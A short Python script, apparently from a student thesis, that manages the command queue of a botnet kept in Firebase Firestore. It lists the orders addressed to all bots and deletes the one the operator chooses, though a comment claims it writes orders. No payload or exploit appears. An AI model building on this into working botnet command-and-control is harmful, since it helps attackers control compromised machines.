import os
import firebase_admin
from firebase_admin import credentials, firestore# initialize sdk
from datetime import datetime

cred = credentials.Certificate("tfg-nicolas-cea-firebase-adminsdk-bq588-0a7759e31d.json")

firebase_admin.initialize_app(cred)# initialize firestore instance

firestore_db = firestore.client()# add data

now = datetime.now()
dt_string = now.strftime("%d-%m-%Y %H:%M:%S")

# Escribe una orden para la botnet
lista = []
docs = firestore_db.collection(u'ordenes').where(u'Bot_ID', u'==', "todos").stream()
cantidad = 0
for doc in docs:
    if(not(doc.id in lista)):
        lista.append(doc.id)

print(lista)

eleccion = input("Select a order to remove: ")
if(eleccion == ""):
    eleccion = 'todos'
firestore_db.collection(u'ordenes').document(eleccion).delete()